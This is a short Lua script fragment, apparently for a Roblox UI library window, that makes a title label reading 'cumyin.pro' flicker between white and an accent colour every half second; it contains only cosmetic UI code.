-- ============================================================
-- FLICKERING TITLE
-- ============================================================
local baseTitle = string.rep(" ", 87)
local titleLabel = nil
task.spawn(function()
    task.wait(0.5)
    local function findTitleLabel()
        local wf = Window.Holder
        if not wf then return nil end
        for _, v in ipairs(wf:GetDescendants()) do
            if v:IsA("TextLabel") and v.Text and v.Text:find("cumyin") then
                return v
            end
        end
        return nil
    end
    titleLabel = findTitleLabel()
    if titleLabel then
        titleLabel.RichText = true
        local visible = true
        while true do
            if titleLabel and titleLabel.Parent then
                local acc = Library.AccentColor
                local proColor = visible and "FFFFFF" or string.format("%02X%02X%02X", acc.R*255, acc.G*255, acc.B*255)
                titleLabel.Text = baseTitle .. '<font color="#FFFFFF">cumyin</font><font color="#'..proColor..'">.pro</font>'
            end
            visible = not visible
            task.wait(0.5)
        end
    end
end)

